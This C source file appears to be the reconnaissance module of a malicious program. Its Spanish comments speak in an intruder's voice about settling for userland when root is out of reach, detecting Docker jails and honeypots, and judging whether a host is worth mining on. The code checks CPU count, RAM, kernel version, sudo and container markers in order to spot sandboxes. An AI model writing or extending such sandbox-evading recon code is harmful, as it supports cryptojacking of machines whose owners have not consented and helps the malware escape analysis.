#include "recon.h"

/* 
 * Pensamiento privado: 
 * Si no podemos ser Root, seremos los dueños eficientes del Userland.
 * Primero, saber dónde estamos. ¿Es una jaula (Docker)? ¿Es un honeypot?
 */

int is_sandboxed() {
    // Comprobación heurística simple
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    struct sysinfo info;
    sysinfo(&info);
    unsigned long ram_mb = info.totalram / 1024 / 1024;

    // Si tiene recursos muy bajos, sospechoso o inútil para minar
    if (cores < 2 || ram_mb < 512) {
        return 1; // Posible sandbox o VPS basura
    }
    return 0;
}

void audit_system(system_info_t *info) {
    struct utsname buffer;
    
    // Info Básica
    if (uname(&buffer) == 0) {
        strncpy(info->kernel_version, buffer.release, sizeof(info->kernel_version));
    } else {
        strcpy(info->kernel_version, "unknown");
    }

    // Recursos
    info->num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    struct sysinfo s_info;
    if (sysinfo(&s_info) == 0) {
        info->total_ram_mb = s_info.totalram / 1024 / 1024;
    } else {
        info->total_ram_mb = 0;
    }

    // Sudo check (informativo)
    info->has_sudo = (access("/usr/bin/sudo", X_OK) == 0);

    // Container Check
    info->is_container = 0;
    if (access("/.dockerenv", F_OK) == 0) {
        info->is_container = 1;
    } else {
        // Check cgroups for docker string
        FILE *f = fopen("/proc/1/cgroup", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "docker") || strstr(line, "lxc")) {
                    info->is_container = 1;
                    break;
                }
            }
            fclose(f);
        }
    }
}
